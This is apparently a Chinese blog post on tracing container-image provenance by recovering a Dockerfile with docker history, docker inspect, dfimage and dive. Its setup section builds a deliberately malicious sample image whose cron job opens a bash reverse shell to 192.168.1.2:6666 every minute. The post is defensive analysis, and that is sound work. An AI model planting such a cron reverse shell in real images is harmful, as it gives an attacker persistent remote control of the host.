---
title: Dockerfile Parser
date: 2023-09-07T20:56:33+08:00
draft: false
url: /posts/2023-09-07/Dockerfile-Parser
tags:
  - Docker
  - Dockerfile-Parser
---

## 0x00 概述

当涉及到容器镜像的安全时，需要追溯镜像的来源和解析Dockerfile文件

## 0x01 环境准备

利用Dockfile构建一个反弹Shell的恶意镜像

```bash
FROM ubuntu:20.04

RUN sed -i 's/archive.ubuntu.com/mirrors.cloud.tencent.com/g' /etc/apt/sources.list

RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime && echo 'Asia/Shanghai' > /etc/timezone

RUN  apt-get update &&\
     apt-get install -y cron &&\
     (echo '* * * * * bash -c "bash -i >& /dev/tcp/192.168.1.2/6666 0>&1"'; crontab -l )| crontab
     
ENTRYPOINT ["cron","-f","&&"]

CMD ["/bin/bash"]
```

## 0x02 镜像解析Dockerfile

### 1. 镜像文件解析

解析镜像的元数据信息

```bash
docker save -o test.tar test:v1.0
tar -xvf test.tar
```

### 2. docker命令参数

docker history 命令用来查看指定镜像一部分的创建历史

加上`--no-trunc`参数才能看到全部的创建历史

```bash
docker history test:v1.0 
docker history test:v1.0  --no-trunc
```

docker inspect 命令用来查看Docker镜像的详细信息

通过`--format`参数可自行定义输出信息，获取镜像的配置信息

```bash
# 查看镜像的配置信息
docker inspect --format='{{json .Config}}' test:v1.0
```

### 3. dfimage

dfimage，从镜像中提取 Dockerfile

```bash
alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"

dfimage -sV=1.36  test:v1.0
```

### 4. Dive

Dive，分析和浏览 Docker 容器镜像内部

项目地址：https://github.com/wagoodman/dive

```bash
alias dive="docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock quay.io/wagoodman/dive"

dive test:v1.0
```

